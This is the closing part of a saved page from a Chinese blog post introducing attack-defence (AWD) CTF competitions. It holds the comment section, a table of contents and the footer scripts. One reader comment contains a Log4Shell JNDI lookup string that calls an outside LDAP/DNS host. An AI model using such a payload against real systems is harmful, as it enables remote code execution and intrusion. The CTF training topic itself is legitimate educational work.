+    <div class="comments v" id="valine-comments" style="opacity: 1; display: block;" data-class="v"><div class="vpanel"><div class="vwrap"><p class="cancel-reply text-right" style="display:none;" title="Cancel reply"><svg class="vicon cancel-reply-btn" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="4220" width="22" height="22"><path d="M796.454 985H227.545c-50.183 0-97.481-19.662-133.183-55.363-35.7-35.701-55.362-83-55.362-133.183V227.545c0-50.183 19.662-97.481 55.363-133.183 35.701-35.7 83-55.362 133.182-55.362h568.909c50.183 0 97.481 19.662 133.183 55.363 35.701 35.702 55.363 83 55.363 133.183v568.909c0 50.183-19.662 97.481-55.363 133.183S846.637 985 796.454 985zM227.545 91C152.254 91 91 152.254 91 227.545v568.909C91 871.746 152.254 933 227.545 933h568.909C871.746 933 933 871.746 933 796.454V227.545C933 152.254 871.746 91 796.454 91H227.545z" p-id="4221"></path><path d="M568.569 512l170.267-170.267c15.556-15.556 15.556-41.012 0-56.569s-41.012-15.556-56.569 0L512 455.431 341.733 285.165c-15.556-15.556-41.012-15.556-56.569 0s-15.556 41.012 0 56.569L455.431 512 285.165 682.267c-15.556 15.556-15.556 41.012 0 56.569 15.556 15.556 41.012 15.556 56.569 0L512 568.569l170.267 170.267c15.556 15.556 41.012 15.556 56.569 0 15.556-15.556 15.556-41.012 0-56.569L568.569 512z" p-id="4222"></path></svg></p><div class="vheader item3"><input name="nick" placeholder="NickName" class="vnick vinput" type="text"><input name="mail" placeholder="E-Mail" class="vmail vinput" type="email"><input name="link" placeholder="Website(http://)" class="vlink vinput" type="text"></div><div class="vedit"><textarea id="veditor" class="veditor vinput" placeholder="Just go go"></textarea><div class="vrow"><div class="vcol vcol-60 status-bar"></div><div class="vcol vcol-40 vctrl text-right"><span title="Emoji" class="vicon vemoji-btn"><svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="16172" width="22" height="22"><path d="M512 1024a512 512 0 1 1 512-512 512 512 0 0 1-512 512zM512 56.888889a455.111111 455.111111 0 1 0 455.111111 455.111111 455.111111 455.111111 0 0 0-455.111111-455.111111zM312.888889 512A85.333333 85.333333 0 1 1 398.222222 426.666667 85.333333 85.333333 0 0 1 312.888889 512z" p-id="16173"></path><path d="M512 768A142.222222 142.222222 0 0 1 369.777778 625.777778a28.444444 28.444444 0 0 1 56.888889 0 85.333333 85.333333 0 0 0 170.666666 0 28.444444 28.444444 0 0 1 56.888889 0A142.222222 142.222222 0 0 1 512 768z" p-id="16174"></path><path d="M782.222222 391.964444l-113.777778 59.733334a29.013333 29.013333 0 0 1-38.684444-10.808889 28.444444 28.444444 0 0 1 10.24-38.684445l113.777778-56.888888a28.444444 28.444444 0 0 1 38.684444 10.24 28.444444 28.444444 0 0 1-10.24 36.408888z" p-id="16175"></path><path d="M640.568889 451.697778l113.777778 56.888889a27.875556 27.875556 0 0 0 38.684444-10.24 27.875556 27.875556 0 0 0-10.24-38.684445l-113.777778-56.888889a28.444444 28.444444 0 0 0-38.684444 10.808889 28.444444 28.444444 0 0 0 10.24 38.115556z" p-id="16176"></path></svg></span><span title="Preview" class="vicon vpreview-btn"><svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="17688" width="22" height="22"><path d="M502.390154 935.384615a29.538462 29.538462 0 1 1 0 59.076923H141.430154C79.911385 994.461538 29.538462 946.254769 29.538462 886.153846V137.846154C29.538462 77.745231 79.950769 29.538462 141.390769 29.538462h741.218462c61.44 0 111.852308 48.206769 111.852307 108.307692v300.268308a29.538462 29.538462 0 1 1-59.076923 0V137.846154c0-26.899692-23.355077-49.230769-52.775384-49.230769H141.390769c-29.420308 0-52.775385 22.331077-52.775384 49.230769v748.307692c0 26.899692 23.355077 49.230769 52.775384 49.230769h360.999385z" p-id="17689"></path><path d="M196.923077 216.615385m29.538461 0l374.153847 0q29.538462 0 29.538461 29.538461l0 0q0 29.538462-29.538461 29.538462l-374.153847 0q-29.538462 0-29.538461-29.538462l0 0q0-29.538462 29.538461-29.538461Z" p-id="17690"></path><path d="M649.846154 846.769231a216.615385 216.615385 0 1 0 0-433.230769 216.615385 216.615385 0 0 0 0 433.230769z m0 59.076923a275.692308 275.692308 0 1 1 0-551.384616 275.692308 275.692308 0 0 1 0 551.384616z" p-id="17691"></path><path d="M807.398383 829.479768m20.886847-20.886846l0 0q20.886846-20.886846 41.773692 0l125.321079 125.321079q20.886846 20.886846 0 41.773693l0 0q-20.886846 20.886846-41.773693 0l-125.321078-125.321079q-20.886846-20.886846 0-41.773693Z" p-id="17692"></path></svg></span></div></div></div><div class="vrow"><div class="vcol vcol-30"><a alt="Markdown is supported" href="https://guides.github.com/features/mastering-markdown/" class="vicon" target="_blank"><svg class="markdown" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M14.85 3H1.15C.52 3 0 3.52 0 4.15v7.69C0 12.48.52 13 1.15 13h13.69c.64 0 1.15-.52 1.15-1.15v-7.7C16 3.52 15.48 3 14.85 3zM9 11H7V8L5.5 9.92 4 8v3H2V5h2l1.5 2L7 5h2v6zm2.99.5L9.5 8H11V5h2v3h1.5l-2.51 3.5z"></path></svg></a></div><div class="vcol vcol-70 text-right"><button type="button" title="Cmd|Ctrl+Enter" class="vsubmit vbtn">Submit</button></div></div><div class="vemojis" style="display:none;"></div><div class="vinput vpreview" style="display:none;"></div></div></div><div class="vcount" style="display: block;"><span class="vnum">2</span> Comments</div><div class="vload-top text-center" style="display:none;"><i class="vspinner" style="width:30px;height:30px;"></i></div><div class="vcards"><div class="vcard" id="61b962a899f5516c7ad2f536"><img class="vimg" src="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/d41d8cd98f00b204e9800998ecf8427e.png"><div class="vh"><div class="vhead"><span class="vnick">Anonymous</span> <span class="vsys">Chrome 96.0.4664.110</span> <span class="vsys">Windows 11</span></div><div class="vmeta"><span class="vtime">2021-12-15</span><span class="vat" data-vm-id="61b962a899f5516c7ad2f536" data-self-id="61b962a899f5516c7ad2f536">Reply</span></div><div class="vcontent" data-expand="See more...."><p>${jndi:ldap://82a6af2c.dns.1433.eu.org/exp}</p>
+</div><div class="vreply-wrapper" data-self-id="61b962a899f5516c7ad2f536"></div><div class="vquote" data-self-id="61b962a899f5516c7ad2f536"></div></div></div><div class="vcard" id="5f62298cfa48ef246c2138b4"><img class="vimg" src="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/d8dd5bf5bb3475fde0acd8866554fd5e.png"><div class="vh"><div class="vhead"><span class="vnick">XCCC</span> <span class="vsys">Chrome 70.0.3538.77</span> <span class="vsys">Windows 11</span></div><div class="vmeta"><span class="vtime">2020-09-16</span><span class="vat" data-vm-id="5f62298cfa48ef246c2138b4" data-self-id="5f62298cfa48ef246c2138b4">Reply</span></div><div class="vcontent" data-expand="See more...."><p>师傅你好，我想问一下它开启的docker的团队的服务器的默认ssh密码是啥</p>
+</div><div class="vreply-wrapper" data-self-id="5f62298cfa48ef246c2138b4"></div><div class="vquote" data-self-id="5f62298cfa48ef246c2138b4"><div class="vcard" id="5fca1ee03c407f150c20a85b"><img class="vimg" src="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/d41d8cd98f00b204e9800998ecf8427e.png"><div class="vh"><div class="vhead"><span class="vnick">Anonymous</span> <span class="vsys">QQBrowser 10.7.4313.400</span> <span class="vsys">Windows 11</span></div><div class="vmeta"><span class="vtime">2020-12-04</span><span class="vat" data-vm-id="5f62298cfa48ef246c2138b4" data-self-id="5fca1ee03c407f150c20a85b">Reply</span></div><div class="vcontent" data-expand="See more...."><p><a class="at" href="https://jlkl.github.io/2019/02/08/Web_13/#5f62298cfa48ef246c2138b4">@XCCC </a> , 密码在pass.txt里面可以看到</p>
+</div><div class="vreply-wrapper" data-self-id="5fca1ee03c407f150c20a85b"></div><div class="vquote" data-self-id="5fca1ee03c407f150c20a85b"></div></div></div></div></div></div></div><div class="vload-bottom text-center" style="display: none;"><i class="vspinner" style="width:30px;height:30px;"></i></div><div class="vempty" style="display:none;"></div><div class="vpage txt-center" style="display:none"><button type="button" class="vmore vbtn">Load More...</button></div><div class="vpower txt-right">Powered By <a href="https://valine.js.org/" target="_blank">Valine</a><br>v1.5.1</div></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar" style="margin-top: 288px;">
+    <div class="sidebar-inner affix" style="opacity: 1; transform: initial;">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc sidebar-nav-active">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel sidebar-panel-active" style="max-height: 700px; opacity: 1;">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="https://jlkl.github.io/2019/02/08/Web_13/#0X00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0X00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="https://jlkl.github.io/2019/02/08/Web_13/#0x01-%E5%85%B3%E4%BA%8E%E7%BA%BF%E4%B8%8B"><span class="nav-number">2.</span> <span class="nav-text">0x01 关于线下</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="https://jlkl.github.io/2019/02/08/Web_13/#0X02-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">3.</span> <span class="nav-text">0X02 环境搭建</span></a></li><li class="nav-item nav-level-2 active"><a class="nav-link" href="https://jlkl.github.io/2019/02/08/Web_13/#0X03-Attack-With-Defence"><span class="nav-number">4.</span> <span class="nav-text">0X03 Attack With Defence</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="https://jlkl.github.io/2019/02/08/Web_13/#1-%E4%BF%AE%E6%94%B9ssh%E5%AF%86%E7%A0%81"><span class="nav-number">4.1.</span> <span class="nav-text">1. 修改ssh密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="https://jlkl.github.io/2019/02/08/Web_13/#2-%E4%BF%AE%E6%94%B9%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%86%E7%A0%81%E5%8F%8A%E5%A4%87%E4%BB%BD%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%88%E4%BB%A5-mysql-%E4%B8%BA%E4%BE%8B%EF%BC%89"><span class="nav-number">4.2.</span> <span class="nav-text">2. 修改数据库密码及备份数据库（以 mysql 为例）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="https://jlkl.github.io/2019/02/08/Web_13/#3-%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD"><span class="nav-number">4.3.</span> <span class="nav-text">3. 源码备份</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="https://jlkl.github.io/2019/02/08/Web_13/#4-%E4%B8%8A-WAF"><span class="nav-number">4.4.</span> <span class="nav-text">4. 上 WAF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="https://jlkl.github.io/2019/02/08/Web_13/#5-%E6%96%87%E4%BB%B6%E7%9B%91%E6%8E%A7"><span class="nav-number">4.5.</span> <span class="nav-text">5. 文件监控</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="https://jlkl.github.io/2019/02/08/Web_13/#6-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E2%80%94%E2%80%94%E4%B8%8D%E6%AD%BB%E9%A9%AC"><span class="nav-number">4.6.</span> <span class="nav-text">6. 权限维持——不死马</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="https://jlkl.github.io/2019/02/08/Web_13/#6-1-%E4%B8%8D%E6%AD%BB%E9%A9%AC%E4%BD%BF%E7%94%A8"><span class="nav-number">4.6.1.</span> <span class="nav-text">6.1. 不死马使用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="https://jlkl.github.io/2019/02/08/Web_13/#6-2-%E4%B8%8D%E6%AD%BB%E9%A9%AC%E7%9A%84%E5%85%8B%E5%88%B6"><span class="nav-number">4.6.2.</span> <span class="nav-text">6.2. 不死马的克制</span></a></li></ol></li><li class="nav-item nav-level-3 active active-current"><a class="nav-link" href="https://jlkl.github.io/2019/02/08/Web_13/#7-%E8%87%AA%E5%8A%A8%E6%8F%90%E4%BA%A4"><span class="nav-number">4.7.</span> <span class="nav-text">7. 自动提交</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="https://jlkl.github.io/2019/02/08/Web_13/#0X04-%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">5.</span> <span class="nav-text">0X04 参考链接</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel" style="opacity: 0; max-height: 700px;">
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Str3am" src="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/Str3am.jpg">
+  <p class="site-author-name" itemprop="name">Str3am</p>
+  <div class="site-description" itemprop="description">这个人很懒，什么也没留下</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="https://jlkl.github.io/archives/">
+        
+          <span class="site-state-item-count">43</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="https://jlkl.github.io/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/jlkl" title="GitHub → https://github.com/jlkl" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:str3am@qq.com" title="E-Mail → mailto:str3am@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://jlkl.github.io/atom.xml" title="RSS → /atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Friends
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://0xmj.github.io/" title="http://0xmj.github.io/" rel="noopener" target="_blank">Mang0</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/sn1per/" title="https://www.cnblogs.com/sn1per/" rel="noopener" target="_blank">Sn1per</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.siriyang.cn/" title="https://blog.siriyang.cn/" rel="noopener" target="_blank">Siriyang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://yyz9.cn/" title="https://yyz9.cn/" rel="noopener" target="_blank">yyz</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  © 2020 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Str3am</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="Symbols count total">414k</span>
+</div><div>我已在此等候你 <span style="color:#1890ff">3</span> 年 <span style="color:#1890ff">6</span> 月 <span style="color:#1890ff">16</span> 天 <span style="color:#1890ff">20</span> 小时 <span style="color:#1890ff">10</span> 分 <span style="color:#1890ff">28</span> 秒</div> 
+
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/moment.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment-precise-range-plugin@1.3.0/moment-precise-range.min.js"></script>
+<script>
+  function timer() {
+    var ages = moment.preciseDiff(moment(),moment(20200108,"YYYYMMDD"));
+    ages = ages.replace(/years?/, "年");
+    ages = ages.replace(/months?/, "月");
+    ages = ages.replace(/days?/, "天");
+    ages = ages.replace(/hours?/, "小时");
+    ages = ages.replace(/minutes?/, "分");
+    ages = ages.replace(/seconds?/, "秒");
+    ages = ages.replace(/\d+/g, '<span style="color:#1890ff">$&</span>');
+    div.innerHTML = `我已在此等候你 ${ages}`;
+  }
+  var div = document.createElement("div");
+  //插入到copyright之后
+  var copyright = document.querySelector(".copyright");
+  document.querySelector(".footer-inner").insertBefore(div, copyright.nextSibling);
+  timer();
+  setInterval("timer()",1000)
+</script>
+
+
+
+
+  <script async="" src="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/love.min.js"></script>
+
+
+
+
+  <script src="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+
+        
+<div class="busuanzi-count">
+  <script async="" src="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: inline;">
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-user"></i>
+        </span>
+        <span class="site-uv" title="我的第  undefined  位朋友，">
+          <span id="busuanzi_value_site_uv"></span>
+        </span>
+      -->
+      <span class="site-uv">
+     我的第  <span style="margin:0 5px;" class="busuanzi-value" id="busuanzi_value_site_uv">17152</span>  位朋友，
+    </span>
+    <!--
+      <span class="post-meta-divider">|</span>
+    -->
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: inline;">
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-eye"></i>
+        </span>
+        <span class="site-pv" title="历经  undefined  次回眸才与你相遇">
+          <span id="busuanzi_value_site_pv"></span>
+        </span>
+      -->
+      <span class="site-pv">
+     历经  <span style="margin:0 5px;" class="busuanzi-value" id="busuanzi_value_site_pv">28295</span>  次回眸才与你相遇
+    </span>
+</span></span></div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div><canvas width="1512" height="802" style="position: fixed; top: 0px; left: 0px; pointer-events: none; z-index: 999999;"></canvas>
+
+  
+  <script src="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/anime.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/velocity.min.js"></script>
+  <script src="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/velocity.ui.min.js"></script>
+
+<script src="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/utils.js"></script>
+
+<script src="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/motion.js"></script>
+
+
+<script src="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/pisces.js"></script>
+
+
+<script src="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el: '#valine-comments',
+      verify: true,
+      notify: true,
+      appId: '3IVY8n0VhhMlAUHBsp34Pxx7-gzGzoHsz',
+      appKey: 'DjdjX2sAzBG2G1G5c6amlBnv',
+      placeholder: "Just go go",
+      avatar: 'mm',
+      meta: guest,
+      pageSize: '10' || 10,
+      visitor: false,
+      lang: 'en' || 'zh-cn',
+      path: location.pathname,
+      recordIP: true,
+      serverURLs: ''
+    });
+  }, window.Valine);
+});
+</script>
+
+
+
+<bookmark-sidebar-fgnml3urw67 id="redeviation-bs-sidebar" class="notranslate" aria-hidden="true" data-theme="default" data-pos="left"><template shadowrootmode="closed"><iframe style="margin:0;padding: 0;border: none;width: 100%;height: 100%;"></iframe></template></bookmark-sidebar-fgnml3urw67><div id="redeviation-bs-indicator" data-theme="default" class="redeviation-bs-fullHeight redeviation-bs-visible" data-pos="left" style="height: 100%; top: 0%;"><div><span></span></div></div></body></html>
